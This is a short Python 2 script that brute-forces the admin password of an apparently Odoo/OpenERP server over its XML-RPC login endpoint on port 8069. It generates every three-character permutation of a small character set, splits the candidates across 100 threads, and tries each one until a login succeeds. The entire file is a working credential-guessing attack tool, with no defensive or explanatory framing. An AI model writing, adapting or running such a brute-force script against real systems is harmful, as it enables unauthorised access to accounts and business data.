#!/usr/bin/env python

import xmlrpclib
from xmlrpclib import *
import threading
import string,math,sys
import itertools,time

PrinTable = string.printable.replace(" ",'').replace('\t\n\r\x0b\x0c','').replace("\\",'')
PrinTable = string.digits +"asdfghjk"
LENGTH = 3

comb = list(itertools.permutations(list(PrinTable),LENGTH))
combination = []
for each in comb:
    eachcomb = ''.join(list(each))
    combination.append(eachcomb)

class Login(threading.Thread):
    def __init__(self, thread_id,block):  
        threading.Thread.__init__(self)  
        self.thread_id = thread_id
        self.block = block
        self.thread_stop = False
    def run(self):
        answer = 0
        print 'Thread %s is running,time:%s\n' %(self.getName(),time.ctime())
        for password in self.block:
            try:
                SVR = ServerProxy("http://localhost:8069/xmlrpc/common")
                answer = SVR.login("V7","admin",password)
            except :print "Error"
            if answer == 1 :
                print "--------------------------------------------"
                print "Finally find password : %s"%password,time.ctime()
                break

def chunks(arr, m):
    n = int(math.ceil(len(arr) / float(m)))
    return [arr[i:i + n] for i in range(0, len(arr), n)]

def makethread(n):
    blocks = chunks(combination,n)
    threads = len(blocks)
    for thread_id in range(threads):
        thread = Login(thread_id,blocks[thread_id])
        thread.start()
    
if __name__ == '__main__':
    
    makethread(100)
